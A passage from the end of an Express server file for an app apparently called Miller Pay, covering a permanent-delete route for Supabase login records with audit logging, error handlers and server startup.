    const { error } = await supabase.from('login_records').delete().in('id', permanentIds)
    if (error) {
      console.error('Supabase error:', error)
      return res.status(500).json({ message: 'Could not permanently delete records.' })
    }
    const previousIds = deletedUserIds
    const removed = new Set(permanentIds)
    deletedUserIds = deletedUserIds.filter((id) => !removed.has(id))
    try {
      await saveSettings()
    } catch {
      deletedUserIds = previousIds
      return res.status(500).json({ message: 'Records deleted, but Trash could not be refreshed.' })
    }
  }
  audit(req, 'admin.users.deleted', `${ids.length} requested record(s)`)
  await saveSecurity()
  res.json({ message: 'Records permanently deleted.' })
})
app.use((_req, res) => res.status(404).json({ message: 'API route not found' }))
app.use((error, _req, res, _next) => {
  console.error(error)
  res.status(500).json({ message: 'Something went wrong on the server.' })
})

async function start() {
  if (process.env.VERCEL !== '1') {
    await refreshSettings(true)
    if (supabase) {
      console.log('Supabase client initialized')
    } else {
      console.log('Local application storage active (no Supabase configured)')
    }
    app.listen(port, () => console.log(`Miller Pay API running on http://localhost:${port}`))
  }
}
start()

export default app
